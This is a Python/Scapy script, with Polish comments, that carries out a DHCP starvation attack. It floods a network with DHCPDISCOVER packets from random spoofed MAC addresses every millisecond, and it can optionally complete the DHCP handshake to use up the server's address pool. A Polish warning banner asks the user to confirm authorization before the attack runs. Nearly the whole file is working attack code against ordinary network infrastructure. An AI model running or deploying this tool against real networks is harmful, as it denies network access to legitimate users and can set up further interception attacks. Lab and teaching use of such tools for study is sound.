from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from time import sleep, time
from threading import Thread

class DHCPStarvation:
    def __init__(self, iface="", singleSpoofedMAC=False, customMAC="", finishDORA=False, sleepTimer=0.2, targetDHCPServerIP="255.255.255.255", loggingEnabled=False):
        self.macs=[]
        self.singlemac=""

        self.iface=iface
        self.singleSpoofedMAC=singleSpoofedMAC
        self.sleepTimer=sleepTimer
        self.finishDORA=finishDORA
        self.targetDHCPServerIP=targetDHCPServerIP
        self.loggingEnabled=loggingEnabled

        if singleSpoofedMAC and customMAC: self.singlemac = customMAC

    # Funkcja drukująca komunikaty na stdout oraz zapisująca do pliku log.txt
    def log(self, message):
        timestamp=str(time()-starttime)[:14]
        out=str(timestamp+"\t"+message+"\n")
        print(out,end="\0")
        if self.loggingEnabled:
            with open("log.txt","a",encoding="UTF-8") as f: f.write(out)

    # Główna pętla programu dokonująca ataku DHCP Starvation 
    # oraz utowrzenie wątku listenera pakietów sieciowych
    def start(self):
        thread = Thread(target=self.listen)
        thread.start()
        self.log(f"Uruchomiono DHCP Starvation")

        while True: self.starve()

    # Nasłuchiwanie pakietów UDP na portach 67 i 68 - Przekazanie pasujących pakietów do metody handleDHCP
    def listen(self): sniff(filter="udp and (port 67 or port 68)", prn=self.handleDHCP, store=0, iface=self.iface)

    # Wysłanie odpowiedzi na DHCPOffer - DHCPRequest z otrzymanymi parametrami konfiguracyjnymi 
    def DHCPRequest(self, client_mac, server_mac, server_ip, given_ip):
        # Definicja pakietu sieciowego do wysłania
        req = Ether(src=client_mac, dst="FF:FF:FF:FF:FF:FF")
        req /= IP(src="0.0.0.0", dst=server_ip)
        req /= UDP(sport=68, dport=67)
        req /= BOOTP(chaddr=client_mac)
        req /= DHCP(options=[
            ("message-type", "request"),
            ("requested_addr", given_ip),
            ("server_id", server_ip),
            "end"])
        
        sendp(req, verbose=0, iface=self.iface)
        self.log(f"Wysłano z\t{client_mac} do ({server_ip} {server_mac}) DHCPREQUEST na {given_ip}")

    def getDHCPOption(self, packet, option:str):
        for i in packet[DHCP].options:
            if i[0] == option: return i[1]

    # Obsługa otrzymanych pakietów DHCP
    def handleDHCP(self, pkt):
        if pkt[DHCP]:
            msgtype = self.getDHCPOption(pkt, "message-type")
            # Jeżeli otrzymamy pakiet DHCPOFFER

            match msgtype:
                case 2:
                    # Pobranie parametrów z pakietu
                    given_ip = pkt.getlayer(BOOTP).yiaddr
                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
                    given_dns = self.getDHCPOption(pkt, "name_server")
                    server_ip = self.getDHCPOption(pkt, "server_id")
                    server_mac = pkt[Ether].src
                    client_mac_b = pkt[BOOTP].chaddr
                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
                    gateway = self.getDHCPOption(pkt, "router")

                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPOFFER ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")

                    if self.finishDORA: self.DHCPRequest(client_mac, server_mac, server_ip, given_ip)

            # Jeżeli otrzymamy pakiet DHCPACK
                case 5:
                    # Pobranie parametrów z pakietu
                    given_ip = pkt.getlayer(BOOTP).yiaddr
                    given_subnet_mask = self.getDHCPOption(pkt, "subnet_mask")
                    given_dns = self.getDHCPOption(pkt, "name_server")
                    server_ip = self.getDHCPOption(pkt, "server_id")
                    server_mac = pkt[Ether].src
                    client_mac_b = pkt[BOOTP].chaddr
                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]
                    gateway = self.getDHCPOption(pkt, "router")

                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPACK ({given_ip} {given_subnet_mask} DNS {given_dns} GATEWAY {gateway})")
                
                # Jeżeli otrzymamy pakiet DHCPNAK
                case 6:
                    server_ip = self.getDHCPOption(pkt, "server_id")
                    server_mac = pkt[Ether].src
                    client_mac_b = pkt[BOOTP].chaddr
                    client_mac = ":".join(format(byte, "02x") for byte in client_mac_b)[:17]

                    self.log(f"Odebrano na\t{client_mac} od ({server_ip} {server_mac}) DHCPNAK")


    # Losowanie adresów MAC i wysyłanie pakietu DHCPDISCOVER
    def starve(self):

        # Generacja adresów MAC (lub jednego adresu w przypadku wybrania takiej opcji)
        src_mac=0
        if self.singleSpoofedMAC:
            if len(self.singlemac)==0: self.singlemac = RandMAC()
            src_mac = self.singlemac
        else:
            src_mac = RandMAC()
            while src_mac in self.macs: src_mac = RandMAC()
            self.macs.append(src_mac)

        # Definicja pakietu sieciowego do wysłania
        pkt = Ether(src=mac2str(src_mac), dst="ff:ff:ff:ff:ff:ff")
        pkt /= IP(src="0.0.0.0", dst=self.targetDHCPServerIP)
        pkt /= UDP(sport=68, dport=67)
        pkt /= BOOTP(chaddr=mac2str(src_mac))
        pkt /= DHCP(options=[
            ("message-type","discover"),
            "end"])
        sendp(pkt, verbose=0, iface=self.iface)
        self.log(f"Wysłano z\t{src_mac} DHCPDISCOVER")
        sleep(self.sleepTimer)

if __name__ == "__main__":
    # Opis poniższych opcji:
    # iface                 - Interfejs do nasłuchiwania i generowania ruchu sieciowego.
    # singleSpoofedMAC      - Czy losować za każdym zapytaniem nowy adres MAC
    # customMAC             - Działa tylko przy singleSpoofedMAC = True. Pozwala na ustalenie własnego adresu MAC do przeprowadzenia ataku
    # finishDORA            - Czy po otrzymaniu DHCP Offer odpowiadać za pomocą DHCP Request
    # sleepTimer            - Odstęp czasu w sekundach między każdym wysłanym pakietem DHCP Discover
    # targetDHCPServerIP    - Adres IP docelowego serwera DHCP. Domyślna wartość 255.255.255.255 to adres broadcast
    # loggingEnabled        - Czy zapisywać każdy z komunikatów do pliku log.txt?

    iface               = "enp3s0"
    singleSpoofedMAC    = False
    customMAC           = "08:bc:20:66:ae:22"
    finishDORA          = False
    sleepTimer          = 0.001
    targetDHCPServerIP  = "255.255.255.255"
    loggingEnabled      = True

    print(
"""
                         !!! UWAGA !!!
    ! ZA CHWILĘ ZOSTANIE URUCHOMIONY ATAK DHCP STARVATION !

Ten program doprowadzi do wygłodzenia serwera DHCP i naruszenia
                poprawnego działania sieci.

   Jeżeli nie jest to Twoja sieć, nie jesteś autoryzowany/a do 
   wykonywania opisanych czynności, lub nie rozumiesz działania
      skryptu, NATYCHMIAST ZAKOŃCZ ten skrypt (np. Ctrl + C).

Jeżeli rozumiesz powyższą treść oraz przyjmujesz odpowiedzialność
     za wszelkie następstwa uruchomienia tego skryptu, aby go 
             uruchomić przepisz frazę "Uruchom atak."
"""
)

    loop = DHCPStarvation(iface, singleSpoofedMAC, customMAC, finishDORA, sleepTimer, targetDHCPServerIP, loggingEnabled)

    while True:
        choice=input("> ")
        if choice=="Uruchom atak.": 
            starttime = time()
            loop.start()
